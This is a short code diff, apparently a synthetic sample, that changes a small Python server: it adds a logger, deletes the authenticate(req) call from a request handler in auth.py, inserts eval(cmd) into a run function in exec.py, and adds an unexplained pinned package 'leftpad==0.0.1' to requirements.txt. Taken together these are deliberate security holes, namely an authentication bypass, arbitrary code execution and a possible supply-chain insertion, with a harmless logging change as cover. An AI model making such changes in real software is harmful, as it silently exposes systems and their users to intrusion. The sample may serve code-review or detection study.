@@ -1,0 +1,26 @@
+diff --git a/server/logging.py b/server/logging.py
+--- a/server/logging.py
++++ b/server/logging.py
+@@ -1,1 +1,2 @@
+ import logging
++log = logging.getLogger(__name__)
+diff --git a/server/auth.py b/server/auth.py
+--- a/server/auth.py
++++ b/server/auth.py
+@@ -10,3 +10,2 @@
+ def handler(req):
+-    authenticate(req)
+     return process(req)
+diff --git a/server/exec.py b/server/exec.py
+--- a/server/exec.py
++++ b/server/exec.py
+@@ -5,2 +5,3 @@
+ def run(cmd):
++    eval(cmd)
+     return 0
+diff --git a/requirements.txt b/requirements.txt
+--- a/requirements.txt
++++ b/requirements.txt
+@@ -1,1 +1,2 @@
+ flask
++leftpad==0.0.1
